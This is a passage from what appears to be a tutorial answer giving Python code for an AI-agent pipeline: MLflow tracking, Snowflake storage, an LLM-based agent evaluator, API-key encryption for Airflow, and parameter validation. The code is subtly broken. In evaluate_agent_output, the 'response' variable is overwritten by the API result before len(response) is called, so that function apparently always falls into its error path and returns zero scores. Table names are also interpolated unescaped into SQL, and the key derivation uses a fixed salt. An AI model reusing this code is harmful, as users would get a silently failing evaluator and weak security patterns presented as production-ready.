            evaluation_path = f"/tmp/evaluation_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(evaluation_path, 'w') as f:
                json.dump(evaluations, f, indent=2)
            
            mlflow.log_artifact(evaluation_path, artifact_path="evaluations")
            os.remove(evaluation_path)
            
            # If evaluations contain numeric scores, log as metrics
            flat_evals = self._flatten_dict(evaluations)
            for key, value in flat_evals.items():
                if isinstance(value, (int, float)):
                    mlflow.log_metric(f"eval_{key}", value)
            
        except Exception as e:
            print(f"Error logging agent evaluation: {e}")
    
    def log_output_data(
        self,
        data: Any,
        output_format: str = "json",
        name: Optional[str] = None
    ):
        """
        Log output data from an agent run.
        
        Args:
            data: Data to log
            output_format: Format to use (json, csv, txt)
            name: Optional name for the output
        """
        try:
            # Ensure we have an active run
            if not mlflow.active_run():
                self.start_run("agent_output")
            
            if name is None:
                name = f"output_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Process based on format
            if output_format == "json":
                output_path = f"/tmp/{name}.json"
                with open(output_path, 'w') as f:
                    if isinstance(data, str):
                        f.write(data)
                    else:
                        json.dump(data, f, indent=2, default=str)
            
            elif output_format == "csv":
                output_path = f"/tmp/{name}.csv"
                if isinstance(data, pd.DataFrame):
                    data.to_csv(output_path, index=False)
                elif isinstance(data, list) and all(isinstance(x, dict) for x in data):
                    pd.DataFrame(data).to_csv(output_path, index=False)
                else:
                    raise ValueError("Data must be DataFrame or list of dicts for CSV format")
            
            elif output_format == "txt":
                output_path = f"/tmp/{name}.txt"
                with open(output_path, 'w') as f:
                    f.write(str(data))
            
            else:
                raise ValueError(f"Unsupported output format: {output_format}")
            
            # Log the artifact
            mlflow.log_artifact(output_path, artifact_path="outputs")
            os.remove(output_path)
            
        except Exception as e:
            print(f"Error logging output data: {e}")
    
    def end_run(self):
        """End the current MLflow run."""
        try:
            if mlflow.active_run():
                mlflow.end_run()
        except Exception as e:
            print(f"Error ending MLflow run: {e}")
    
    def _log_nested_params(self, prefix, params_dict):
        """Log nested parameters with prefixed keys."""
        flat_params = self._flatten_dict(params_dict, prefix)
        for key, value in flat_params.items():
            if isinstance(value, (str, int, float, bool)):
                mlflow.log_param(key, value)
    
    def _flatten_dict(self, d, parent_key='', sep='_'):
        """Flatten nested dictionaries for parameter logging."""
        items = []
        for k, v in d.items():
            new_key = f"{parent_key}{sep}{k}" if parent_key else k
            if isinstance(v, dict):
                items.extend(self._flatten_dict(v, new_key, sep=sep).items())
            else:
                items.append((new_key, v))
        return dict(items)

# Example usage
if __name__ == "__main__":
    # Initialize tracker
    tracker = AIAgentExperimentTracker(
        experiment_name="financial_analysis_agents",
        tags={"domain": "finance", "purpose": "stock_analysis"}
    )
    
    # Start a run
    run_id = tracker.start_run(
        run_name="daily_market_analysis",
        tags={"stocks": "AAPL,MSFT,GOOGL", "date": "2023-09-15"},
        agent_config={
            "agent_types": ["FinancialAnalyst", "DataScientist", "ReportWriter"],
            "models": {
                "primary": "gpt-4-turbo",
                "fallback": "gpt-3.5-turbo"
            },
            "temperature": 0.2
        }
    )
    
    # Log sample interaction
    tracker.log_agent_interaction(
        agent_name="FinancialAnalyst",
        prompt="Analyze AAPL performance on 2023-09-15",
        response="Apple (AAPL) closed at $175.62, down 0.8% from previous close...",
        metrics={
            "tokens": 250,
            "response_time": 0.85,
            "cost": 0.02
        },
        metadata={
            "model": "gpt-4-turbo",
            "temperature": 0.2
        }
    )
    
    # Log evaluation
    tracker.log_agent_evaluation(
        evaluations={
            "accuracy": 0.92,
            "completeness": 0.88,
            "reasoning": 0.90,
            "usefulness": 0.85,
            "detailed_scores": {
                "factual_accuracy": 0.95,
                "calculation_accuracy": 0.89,
                "insight_quality": 0.87
            }
        },
        metrics={
            "overall_quality": 0.89,
            "execution_time": 12.5
        }
    )
    
    # Log output
    tracker.log_output_data(
        {
            "report": "Financial Analysis Report - 2023-09-15",
            "stocks_analyzed": ["AAPL", "MSFT", "GOOGL"],
            "key_insights": [
                "Tech sector showed weakness with average decline of 0.7%",
                "AAPL volume 15% above 30-day average despite price decline",
                "MSFT outperformed peers with 0.2% gain"
            ]
        },
        output_format="json",
        name="financial_report"
    )
    
    # End the run
    tracker.end_run()
```

Let's also create a Snowflake integration component for enterprise data management:

```python
# snowflake_integration.py
import os
import json
import pandas as pd
import snowflake.connector
from snowflake.connector.pandas_tools import write_pandas
from typing import Dict, Any, List, Optional, Union

class SnowflakeAgentIntegration:
    """Integration with Snowflake for AI agent data pipelines."""
    
    def __init__(
        self,
        account: str,
        user: str,
        password: str = None,
        database: str = None,
        schema: str = None,
        warehouse: str = None,
        role: str = None,
        authenticator: str = None,
        private_key_path: str = None,
        private_key_passphrase: str = None
    ):
        """
        Initialize Snowflake connection parameters.
        
        Args:
            account: Snowflake account identifier
            user: Snowflake username
            password: Optional password (use private key or SSO instead for production)
            database: Default database
            schema: Default schema
            warehouse: Compute warehouse
            role: Snowflake role
            authenticator: Authentication method (e.g., 'externalbrowser' for SSO)
            private_key_path: Path to private key file for key-pair authentication
            private_key_passphrase: Passphrase for private key if encrypted
        """
        self.account = account
        self.user = user
        self.password = password
        self.database = database
        self.schema = schema
        self.warehouse = warehouse
        self.role = role
        self.authenticator = authenticator
        self.private_key_path = private_key_path
        self.private_key_passphrase = private_key_passphrase
        
        # Initialize connection as None
        self.conn = None
    
    def connect(self):
        """Establish connection to Snowflake."""
        try:
            # Prepare connection parameters
            connect_params = {
                "account": self.account,
                "user": self.user,
                "database": self.database,
                "schema": self.schema,
                "warehouse": self.warehouse,
                "role": self.role
            }
            
            # Add authentication method
            if self.password:
                connect_params["password"] = self.password
            elif self.authenticator:
                connect_params["authenticator"] = self.authenticator
            elif self.private_key_path:
                with open(self.private_key_path, "rb") as key:
                    p_key = key.read()
                    if self.private_key_passphrase:
                        connect_params["private_key"] = p_key
                        connect_params["private_key_passphrase"] = self.private_key_passphrase
                    else:
                        connect_params["private_key"] = p_key
            
            # Remove None values
            connect_params = {k: v for k, v in connect_params.items() if v is not None}
            
            # Establish connection
            self.conn = snowflake.connector.connect(**connect_params)
            
            return self.conn
            
        except Exception as e:
            print(f"Error connecting to Snowflake: {e}")
            raise
    
    def execute_query(self, query: str, params: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """
        Execute a SQL query and return results as list of dictionaries.
        
        Args:
            query: SQL query to execute
            params: Optional query parameters
            
        Returns:
            List of dictionaries with query results
        """
        try:
            # Connect if not already connected
            if not self.conn:
                self.connect()
            
            # Create cursor and execute query
            cursor = self.conn.cursor(snowflake.connector.DictCursor)
            
            if params:
                cursor.execute(query, params)
            else:
                cursor.execute(query)
            
            # Fetch results
            results = cursor.fetchall()
            
            # Close cursor
            cursor.close()
            
            return results
            
        except Exception as e:
            print(f"Error executing query: {e}")
            raise
    
    def query_to_dataframe(self, query: str, params: Dict[str, Any] = None) -> pd.DataFrame:
        """
        Execute a SQL query and return results as Pandas DataFrame.
        
        Args:
            query: SQL query to execute
            params: Optional query parameters
            
        Returns:
            Pandas DataFrame with query results
        """
        try:
            # Connect if not already connected
            if not self.conn:
                self.connect()
            
            # Execute query directly to DataFrame
            if params:
                df = pd.read_sql(query, self.conn, params=params)
            else:
                df = pd.read_sql(query, self.conn)
            
            return df
            
        except Exception as e:
            print(f"Error executing query to DataFrame: {e}")
            raise
    
    def upload_dataframe(
        self,
        df: pd.DataFrame,
        table_name: str,
        schema: Optional[str] = None,
        database: Optional[str] = None,
        chunk_size: Optional[int] = None,
        auto_create_table: bool = False
    ) -> Dict[str, Any]:
        """
        Upload a Pandas DataFrame to Snowflake table.
        
        Args:
            df: DataFrame to upload
            table_name: Destination table name
            schema: Optional schema (overrides default)
            database: Optional database (overrides default)
            chunk_size: Optional chunk size for large uploads
            auto_create_table: Whether to automatically create table if it doesn't exist
            
        Returns:
            Dictionary with upload results
        """
        try:
            # Connect if not already connected
            if not self.conn:
                self.connect()
            
            # Use default schema/database if not specified
            schema = schema or self.schema
            database = database or self.database
            
            # Create fully qualified table name
            qualified_table_name = f"{database}.{schema}.{table_name}" if database and schema else table_name
            
            # Check if table exists
            if auto_create_table:
                self._ensure_table_exists(df, qualified_table_name)
            
            # Upload DataFrame
            success, num_chunks, num_rows, output = write_pandas(
                conn=self.conn,
                df=df,
                table_name=table_name,
                schema=schema,
                database=database,
                chunk_size=chunk_size,
                quote_identifiers=True
            )
            
            return {
                "success": success,
                "chunks": num_chunks,
                "rows": num_rows,
                "output": output,
                "table": qualified_table_name
            }
            
        except Exception as e:
            print(f"Error uploading DataFrame: {e}")
            raise
    
    def upload_json(
        self,
        data: Union[Dict[str, Any], List[Dict[str, Any]]],
        table_name: str,
        schema: Optional[str] = None,
        database: Optional[str] = None,
        flatten: bool = False
    ) -> Dict[str, Any]:
        """
        Upload JSON data to Snowflake table.
        
        Args:
            data: Dictionary or list of dictionaries to upload
            table_name: Destination table name
            schema: Optional schema (overrides default)
            database: Optional database (overrides default)
            flatten: Whether to flatten nested structures
            
        Returns:
            Dictionary with upload results
        """
        try:
            # Convert to DataFrame based on data type
            if isinstance(data, dict):
                if flatten:
                    # Flatten nested dict
                    flat_data = self._flatten_json(data)
                    df = pd.DataFrame([flat_data])
                else:
                    # Convert single dict to DataFrame with one row
                    df = pd.DataFrame([data])
            elif isinstance(data, list) and all(isinstance(item, dict) for item in data):
                if flatten:
                    # Flatten each dict in the list
                    flat_list = [self._flatten_json(item) for item in data]
                    df = pd.DataFrame(flat_list)
                else:
                    # Convert list of dicts directly to DataFrame
                    df = pd.DataFrame(data)
            else:
                raise ValueError("Data must be a dictionary or list of dictionaries")
            
            # Handle nested JSON structures by converting to strings
            for col in df.columns:
                if isinstance(df[col].iloc[0], (dict, list)):
                    df[col] = df[col].apply(lambda x: json.dumps(x))
            
            # Upload the DataFrame
            return self.upload_dataframe(
                df=df,
                table_name=table_name,
                schema=schema,
                database=database,
                auto_create_table=True
            )
            
        except Exception as e:
            print(f"Error uploading JSON: {e}")
            raise
    
    def store_agent_results(
        self,
        agent_results: Dict[str, Any],
        metadata: Dict[str, Any],
        table_name: str = "AGENT_RESULTS",
        schema: Optional[str] = None,
        database: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Store AI agent results with metadata in Snowflake.
        
        Args:
            agent_results: Results from AI agent
            metadata: Metadata about the agent run
            table_name: Destination table name
            schema: Optional schema (overrides default)
            database: Optional database (overrides default)
            
        Returns:
            Dictionary with upload results
        """
        try:
            # Prepare combined data
            combined_data = {
                "results": json.dumps(agent_results),
                "metadata": json.dumps(metadata),
                "created_at": pd.Timestamp.now()
            }
            
            # Add metadata fields as top-level columns for easier querying
            for key, value in metadata.items():
                if isinstance(value, (str, int, float, bool)) or value is None:
                    combined_data[f"meta_{key}"] = value
            
            # Upload to Snowflake
            df = pd.DataFrame([combined_data])
            return self.upload_dataframe(
                df=df,
                table_name=table_name,
                schema=schema,
                database=database,
                auto_create_table=True
            )
            
        except Exception as e:
            print(f"Error storing agent results: {e}")
            raise
    
    def close(self):
        """Close the Snowflake connection."""
        if self.conn:
            self.conn.close()
            self.conn = None
    
    def _ensure_table_exists(self, df: pd.DataFrame, table_name: str):
        """
        Create table if it doesn't exist based on DataFrame structure.
        
        Args:
            df: DataFrame to use for table schema
            table_name: Fully qualified table name
        """
        try:
            # Check if table exists
            check_query = f"SHOW TABLES LIKE '{table_name.split('.')[-1]}'"
            if '.' in table_name:
                parts = table_name.split('.')
                if len(parts) == 3:
                    check_query = f"SHOW TABLES LIKE '{parts[2]}' IN SCHEMA {parts[0]}.{parts[1]}"
            
            cursor = self.conn.cursor()
            cursor.execute(check_query)
            table_exists = cursor.fetchone() is not None
            
            if not table_exists:
                # Generate CREATE TABLE statement based on DataFrame
                columns = []
                for col_name, dtype in zip(df.columns, df.dtypes):
                    if pd.api.types.is_integer_dtype(dtype):
                        col_type = "INTEGER"
                    elif pd.api.types.is_float_dtype(dtype):
                        col_type = "FLOAT"
                    elif pd.api.types.is_bool_dtype(dtype):
                        col_type = "BOOLEAN"
                    elif pd.api.types.is_datetime64_dtype(dtype):
                        col_type = "TIMESTAMP_NTZ"
                    else:
                        # Check if column contains JSON
                        if df[col_name].iloc[0] and isinstance(df[col_name].iloc[0], str):
                            try:
                                json.loads(df[col_name].iloc[0])
                                col_type = "VARIANT"  # For JSON data
                            except:
                                col_type = "VARCHAR"
                        else:
                            col_type = "VARCHAR"
                    
                    columns.append(f'"{col_name}" {col_type}')
                
                # Create the table
                create_query = f"CREATE TABLE IF NOT EXISTS {table_name} ({', '.join(columns)})"
                cursor.execute(create_query)
            
            cursor.close()
            
        except Exception as e:
            print(f"Error creating table: {e}")
            raise
    
    def _flatten_json(self, d: Dict[str, Any], parent_key: str = '', sep: str = '_') -> Dict[str, Any]:
        """
        Flatten nested JSON structures.
        
        Args:
            d: Dictionary to flatten
            parent_key: Parent key for recursive calls
            sep: Separator for nested keys
            
        Returns:
            Flattened dictionary
        """
        items = []
        for k, v in d.items():
            new_key = f"{parent_key}{sep}{k}" if parent_key else k
            
            if isinstance(v, dict):
                items.extend(self._flatten_json(v, new_key, sep=sep).items())
            elif isinstance(v, list):
                # Convert lists to JSON strings
                items.append((new_key, json.dumps(v)))
            else:
                items.append((new_key, v))
                
        return dict(items)
```

Let's also implement an agent evaluation component:

```python
# agent_evaluation.py
import json
import pandas as pd
import numpy as np
import openai
from typing import Dict, Any, List, Optional, Union, Tuple

class AgentEvaluator:
    """Evaluate AI agents for quality, correctness, and performance."""
    
    def __init__(self, openai_api_key: str):
        """
        Initialize the evaluator.
        
        Args:
            openai_api_key: OpenAI API key for evaluation
        """
        self.openai_client = openai.OpenAI(api_key=openai_api_key)
    
    def evaluate_agent_output(
        self,
        prompt: str,
        response: str,
        ground_truth: Optional[str] = None,
        criteria: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Evaluate an agent's response against criteria and optionally ground truth.
        
        Args:
            prompt: The original prompt given to the agent
            response: The agent's response
            ground_truth: Optional ground truth for factual comparison
            criteria: Optional evaluation criteria
            
        Returns:
            Dictionary with evaluation scores and feedback
        """
        if criteria is None:
            criteria = [
                "accuracy", 
                "completeness", 
                "relevance",
                "coherence",
                "conciseness"
            ]
        
        # Construct evaluation prompt
        eval_prompt = f"""Evaluate the following AI assistant response to a user prompt.

USER PROMPT:
{prompt}

AI RESPONSE:
{response}

"""
        if ground_truth:
            eval_prompt += f"""
GROUND TRUTH (for factual comparison):
{ground_truth}

"""
        
        eval_prompt += f"""
Please evaluate the response on the following criteria on a scale of 1-10:
{', '.join(criteria)}

Provide an explanation for each score and give specific examples from the response.
Then provide an overall score (1-10) and a brief summary of the evaluation.

Format your response as a JSON object with the following structure:
{{
    "criteria_scores": {{
        "criterion1": {{
            "score": X,
            "explanation": "Your explanation"
        }},
        ...
    }},
    "overall_score": X,
    "summary": "Your summary",
    "strengths": ["strength1", "strength2", ...],
    "weaknesses": ["weakness1", "weakness2", ...]
}}
"""
        
        try:
            # Get evaluation from OpenAI
            response = self.openai_client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are an objective evaluator of AI assistant responses. Provide fair, balanced, and detailed evaluations."},
                    {"role": "user", "content": eval_prompt}
                ],
                response_format={"type": "json_object"},
                temperature=0.2
            )
            
            # Parse the result
            evaluation = json.loads(response.choices[0].message.content)
            
            # Add metadata
            evaluation["evaluation_metadata"] = {
                "model": "gpt-4-turbo",
                "prompt_length": len(prompt),
                "response_length": len(response),
                "criteria_evaluated": criteria
            }
            
            return evaluation
            
        except Exception as e:
            print(f"Error evaluating agent output: {e}")
            return {
                "error": str(e),
                "criteria_scores": {c: {"score": 0, "explanation": "Evaluation failed"} for c in criteria},
                "overall_score": 0,
                "summary": f"Evaluation failed: {str(e)}"
            }
    
    def evaluate_factual_accuracy(
        self,
        response: str,
        ground_truth: str
    ) -> Dict[str, Any]:
        """
        Evaluate the factual accuracy of an agent's response.
        
        Args:
            response: The agent's response
            ground_truth: The ground truth for comparison
            
        Returns:
            Dictionary with accuracy scores and details
        """
        try:
            # Construct evaluation prompt
            eval_prompt = f"""Evaluate the factual accuracy of the following AI response compared to the ground truth.

AI RESPONSE:
{response}

GROUND TRUTH:
{ground_truth}

Identify all factual statements in the AI response and check if they are:
1. Correct (matches ground truth)
2. Incorrect (contradicts ground truth)
3. Unverifiable (not mentioned in ground truth)

For each factual claim, provide:
1. The claim from the AI response
2. Whether it's correct, incorrect, or unverifiable
3. The relevant ground truth information (if applicable)

Then calculate:
1. Accuracy rate (correct claims / total verifiable claims)
2. Error rate (incorrect claims / total verifiable claims)
3. Hallucination rate (unverifiable claims / total claims)

Format your response as a JSON object with the following structure:
{{
    "factual_claims": [
        {{
            "claim": "The claim text",
            "assessment": "correct|incorrect|unverifiable",
            "ground_truth_reference": "Relevant ground truth text or null",
            "explanation": "Explanation of assessment"
        }},
        ...
    ],
    "metrics": {{
        "total_claims": X,
        "correct_claims": X,
        "incorrect_claims": X,
        "unverifiable_claims": X,
        "accuracy_rate": X.XX,
        "error_rate": X.XX,
        "hallucination_rate": X.XX
    }},
    "summary": "Overall assessment of factual accuracy"
}}
"""
            
            # Get evaluation from OpenAI
            response = self.openai_client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are an expert fact-checker who carefully evaluates the factual accuracy of information."},
                    {"role": "user", "content": eval_prompt}
                ],
                response_format={"type": "json_object"},
                temperature=0.1
            )
            
            # Parse the result
            evaluation = json.loads(response.choices[0].message.content)
            
            return evaluation
            
        except Exception as e:
            print(f"Error evaluating factual accuracy: {e}")
            return {
                "error": str(e),
                "metrics": {
                    "accuracy_rate": 0,
                    "error_rate": 0,
                    "hallucination_rate": 0
                },
                "summary": f"Evaluation failed: {str(e)}"
            }
    
    def evaluate_multi_agent_workflow(
        self,
        task_description: str,
        agent_interactions: List[Dict[str, Any]],
        final_output: str,
        expected_output: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Evaluate a multi-agent workflow.
        
        Args:
            task_description: The original task
            agent_interactions: List of agent interactions in the workflow
            final_output: The final output of the workflow
            expected_output: Optional expected output for comparison
            
        Returns:
            Dictionary with workflow evaluation
        """
        try:
            # Format agent interactions for evaluation
            interactions_text = ""
            for i, interaction in enumerate(agent_interactions, 1):
                agent_name = interaction.get("agent_name", f"Agent {i}")
                prompt = interaction.get("prompt", "")
                response = interaction.get("response", "")
                
                interactions_text += f"\n--- INTERACTION {i} ---\n"
                interactions_text += f"AGENT: {agent_name}\n"
                interactions_text += f"PROMPT:\n{prompt}\n\n"
                interactions_text += f"RESPONSE:\n{response}\n"
            
            # Construct evaluation prompt
            eval_prompt = f"""Evaluate this multi-agent workflow for completing a task.

TASK DESCRIPTION:
{task_description}

AGENT INTERACTIONS:
{interactions_text}

FINAL OUTPUT:
{final_output}

"""
            if expected_output:
                eval_prompt += f"""
EXPECTED OUTPUT:
{expected_output}

"""
            
            eval_prompt += """
Evaluate the workflow on these criteria:
1. Task Completion: Did the agents successfully complete the task?
2. Efficiency: Was the workflow efficient, or were there unnecessary steps?
3. Agent Collaboration: How well did the agents collaborate and share information?
4. Agent Specialization: Did each agent contribute based on their expertise?
5. Error Handling: How well were errors or uncertainties handled?
6. Output Quality: How good is the final output?

Format your response as a JSON object with the following structure:
{
    "workflow_evaluation": {
        "task_completion": {
            "score": X,
            "comments": "Your assessment"
        },
        "efficiency": {
            "score": X,
            "comments": "Your assessment"
        },
        "agent_collaboration": {
            "score": X,
            "comments": "Your assessment"
        },
        "agent_specialization": {
            "score": X,
            "comments": "Your assessment"
        },
        "error_handling": {
            "score": X,
            "comments": "Your assessment"
        },
        "output_quality": {
            "score": X,
            "comments": "Your assessment"
        }
    },
    "agent_contributions": [
        {
            "agent_name": "Agent name",
            "contribution_quality": X,
            "key_contributions": ["contribution1", "contribution2"]
        },
        ...
    ],
    "overall_score": X,
    "improvement_suggestions": ["suggestion1", "suggestion2", ...],
    "summary": "Overall workflow assessment"
}
"""
            
            # Get evaluation from OpenAI
            response = self.openai_client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are an expert in multi-agent AI systems who evaluates workflows for efficiency and effectiveness."},
                    {"role": "user", "content": eval_prompt}
                ],
                response_format={"type": "json_object"},
                temperature=0.3
            )
            
            # Parse the result
            evaluation = json.loads(response.choices[0].message.content)
            
            # Calculate metrics
            scores = [
                evaluation["workflow_evaluation"]["task_completion"]["score"],
                evaluation["workflow_evaluation"]["efficiency"]["score"],
                evaluation["workflow_evaluation"]["agent_collaboration"]["score"],
                evaluation["workflow_evaluation"]["agent_specialization"]["score"],
                evaluation["workflow_evaluation"]["error_handling"]["score"],
                evaluation["workflow_evaluation"]["output_quality"]["score"]
            ]
            
            avg_score = sum(scores) / len(scores)
            
            # Add calculated metrics
            evaluation["metrics"] = {
                "average_criteria_score": avg_score,
                "interaction_count": len(agent_interactions),
                "agent_count": len(set(interaction.get("agent_name", f"Agent {i}") for i, interaction in enumerate(agent_interactions))),
                "output_length": len(final_output)
            }
            
            return evaluation
            
        except Exception as e:
            print(f"Error evaluating multi-agent workflow: {e}")
            return {
                "error": str(e),
                "overall_score": 0,
                "summary": f"Evaluation failed: {str(e)}"
            }
    
    def benchmark_agent(
        self,
        agent_function,
        test_cases: List[Dict[str, Any]],
        metrics: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Benchmark an agent against a set of test cases.
        
        Args:
            agent_function: Function that takes input and returns agent response
            test_cases: List of test cases with input and expected output
            metrics: Optional list of metrics to evaluate
            
        Returns:
            Dictionary with benchmark results
        """
        if metrics is None:
            metrics = ["accuracy", "relevance", "completeness"]
        
        results = []
        
        for i, test_case in enumerate(test_cases):
            case_id = test_case.get("id", f"case_{i}")
            input_data = test_case.get("input", "")
            expected_output = test_case.get("expected_output", None)
            
            try:
                # Run the agent
                start_time = pd.Timestamp.now()
                agent_output = agent_function(input_data)
                end_time = pd.Timestamp.now()
                duration = (end_time - start_time).total_seconds()
                
                # Evaluate output
                evaluation = self.evaluate_agent_output(
                    prompt=input_data,
                    response=agent_output,
                    ground_truth=expected_output,
                    criteria=metrics
                )
                
                # Compile results
                case_result = {
                    "case_id": case_id,
                    "input": input_data,
                    "output": agent_output,
                    "expected_output": expected_output,
                    "execution_time": duration,
                    "evaluation": evaluation,
                    "overall_score": evaluation.get("overall_score", 0)
                }
                
                results.append(case_result)
                
            except Exception as e:
                print(f"Error in test case {case_id}: {e}")
                results.append({
                    "case_id": case_id,
                    "input": input_data,
                    "error": str(e),
                    "overall_score": 0
                })
        
        # Aggregate results
        overall_scores = [r.get("overall_score", 0) for r in results if "overall_score" in r]
        avg_score = sum(overall_scores) / len(overall_scores) if overall_scores else 0
        
        execution_times = [r.get("execution_time", 0) for r in results if "execution_time" in r]
        avg_execution_time = sum(execution_times) / len(execution_times) if execution_times else 0
        
        # Calculate per-metric averages
        metric_scores = {}
        for metric in metrics:
            scores = []
            for r in results:
                if "evaluation" in r and "criteria_scores" in r["evaluation"]:
                    if metric in r["evaluation"]["criteria_scores"]:
                        scores.append(r["evaluation"]["criteria_scores"][metric].get("score", 0))
            
            metric_scores[metric] = sum(scores) / len(scores) if scores else 0
        
        return {
            "benchmark_summary": {
                "test_cases": len(test_cases),
                "successful_cases": len([r for r in results if "error" not in r]),
                "average_score": avg_score,
                "average_execution_time": avg_execution_time,
                "metric_averages": metric_scores
            },
            "case_results": results
        }
```

**Key Advantages:**

1. **Enterprise Integration**: Seamless integration with Snowflake for secure data storage and analytics
2. **Robust Scheduling**: Airflow provides enterprise-grade task scheduling and dependency management
3. **Workflow Monitoring**: Built-in monitoring and alerting for AI agent workflows
4. **Data Governance**: Enterprise-grade data lineage and governance with Snowflake
5. **Experiment Tracking**: MLflow integration for tracking agent performance and experiments

**Production Considerations:**

1. **Securing API Keys**:

For production deployment, implement proper API key management:

```python
# api_key_management.py
import os
import base64
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from airflow.models import Variable
from airflow.hooks.base import BaseHook

class APIKeyManager:
    """Securely manage API keys in Airflow."""
    
    def __init__(self, master_key_env="MASTER_ENCRYPTION_KEY"):
        """
        Initialize the key manager.
        
        Args:
            master_key_env: Environment variable name for master key
        """
        # Get master key from environment
        master_key = os.environ.get(master_key_env)
        if not master_key:
            raise ValueError(f"Master encryption key not found in environment variable {master_key_env}")
        
        # Derive encryption key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'airflow_api_key_manager',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(master_key.encode()))
        self.cipher = Fernet(key)
    
    def encrypt_key(self, api_key):
        """Encrypt an API key."""
        return self.cipher.encrypt(api_key.encode()).decode()
    
    def decrypt_key(self, encrypted_key):
        """Decrypt an API key."""
        return self.cipher.decrypt(encrypted_key.encode()).decode()
    
    def store_in_airflow(self, key_name, api_key):
        """Store an encrypted API key in Airflow Variables."""
        encrypted = self.encrypt_key(api_key)
        Variable.set(key_name, encrypted)
    
    def get_from_airflow(self, key_name):
        """Get and decrypt an API key from Airflow Variables."""
        encrypted = Variable.get(key_name)
        return self.decrypt_key(encrypted)
    
    def store_connection(self, conn_id, conn_type, host, login, password, port=None, extra=None):
        """Store a connection in Airflow connections."""
        # Encrypt sensitive parts
        encrypted_password = self.encrypt_key(password)
        
        # Create connection object
        conn = BaseHook.get_connection(conn_id)
        conn.conn_type = conn_type
        conn.host = host
        conn.login = login
        conn.password = encrypted_password
        conn.port = port
        
        if extra:
            # Encrypt extra fields if any
            if isinstance(extra, dict):
                encrypted_extra = {}
                for k, v in extra.items():
                    encrypted_extra[k] = self.encrypt_key(v) if isinstance(v, str) else v
                conn.extra = json.dumps(encrypted_extra)
            else:
                conn.extra = extra
        
        # Save connection
        conn.save()
```

2. **Parameter Management and Validation**:

```python
# parameter_management.py
from marshmallow import Schema, fields, validates, ValidationError
from typing import Dict, Any

class FinancialAnalysisSchema(Schema):
    """Schema for validating financial analysis parameters."""
    analysis_date = fields.Date(required=True)
    stock_symbols = fields.List(fields.String(), required=True)
    report_type = fields.String(required=True, validate=lambda x: x in ["standard", "detailed", "executive"])
    include_sentiment = fields.Boolean(default=True)
    market_context = fields.Boolean(default=True)
    max_stocks = fields.Integer(default=10)
    
    @validates("stock_symbols")
    def validate_symbols(self, symbols):
        """Validate stock symbols."""
        if not symbols:
            raise ValidationError("At least one stock symbol is required")
        
        if len(symbols) > 20:
            raise ValidationError("Maximum of 20 stock symbols allowed")
        
        for symbol in symbols:
            if not symbol.isalpha():
                raise ValidationError(f"Invalid stock symbol: {symbol}")

def validate_dag_params(params: Dict[str, Any], schema_class) -> Dict[str, Any]:
    """
    Validate DAG parameters using a schema.
    
    Args:
        params: Parameters to validate
        schema_class: Schema class for validation
        
    Returns:
        Validated parameters
        
    Raises:
        ValueError: If validation fails
    """
    schema = schema_class()
    try:
        # Validate parameters
        validated_params = schema.load(params)
        return validated_params
    except ValidationError as err:
        error_messages = []
        for field, messages in err.messages.items():
            if isinstance(messages, list):
                error_messages.append(f"{field}: {', '.join(messages)}")
            else:
                error_messages.append(f"{field}: {messages}")
        
        error_str = "; ".join(error_messages)
        raise ValueError(f"Parameter validation failed: {error_str}")
```

3. **Airflow Optimizations**:

For production Airflow deployments, consider these optimizations:

```python
# airflow_config.py
from airflow.models import Variable
import subprocess
import os

# Recommended Airflow configuration optimizations
def optimize_airflow_config():
    """Apply optimizations to Airflow configuration."""
    # Set environment variables
    os.environ["AIRFLOW__CORE__MAX_ACTIVE_RUNS_PER_DAG"] = "1"
    os.environ["AIRFLOW__CORE__PARALLELISM"] = "32"
    os.environ["AIRFLOW__CORE__DAG_CONCURRENCY"] = "16"
    os.environ["AIRFLOW__CORE__MAX_ACTIVE_TASKS_PER_DAG"] = "16"
    os.environ["AIRFLOW__SCHEDULER__SCHEDULER_HEARTBEAT_SEC"] = "20"
    os.environ["AIRFLOW__CORE__MIN_SERIALIZED_DAG_UPDATE_INTERVAL"] = "30"
    os.environ["AIRFLOW__CORE__MIN_SERIALIZED_DAG_FETCH_INTERVAL"] = "30"
    os.environ["AIRFLOW__CORE__STORE_DAG_CODE"] = "True"
    os.environ["AIRFLOW__CORE__STORE_SERIALIZED_DAGS"] = "True"
    os.environ["AIRFLOW__CORE__EXECUTE_TASKS_NEW_PYTHON_INTERPRETER"] = "True"
    
    # Configure Celery executor settings
    os.environ["AIRFLOW__CELERY__WORKER_AUTOSCALE"] = "8,2"
    os.environ["AIRFLOW__CELERY__WORKER_PREFETCH_MULTIPLIER"] = "1"
    os.environ["AIRFLOW__CELERY__TASK_POOL_LIMIT"] = "4"
    os.environ["AIRFLOW__CELERY__OPERATION_TIMEOUT"] = "1800"  # 30 minutes
    
    # Logging optimizations
    os.environ["AIRFLOW__LOGGING__REMOTE_LOGGING"] = "True"
    os.environ["AIRFLOW__LOGGING__REMOTE_LOG_CONN_ID"] = "aws_default"
    os.environ["AIRFLOW__LOGGING__REMOTE_BASE_LOG_FOLDER"] = "s3://airflow-logs-bucket/logs"
    
    print("Applied Airflow optimizations")

# Configure resource allocation for specific tasks
def configure_task_resources(ti):
    """Configure resources for specific tasks in the DAG."""
    task_id = ti.task_id
    
    # Configure based on task type
    if "analysis" in task_id:
        # Allocate more resources for analysis tasks
        ti.executor_config = {
            "KubernetesExecutor": {
                "request_memory": "4Gi",
                "request_cpu": "2",
                "limit_memory": "8Gi",
                "limit_cpu": "4"
            }
        }
    elif "extract" in task_id:
        # Database-heavy tasks
        ti.executor_config = {
            "KubernetesExecutor": {
                "request_memory": "2Gi",
                "request_cpu": "1",
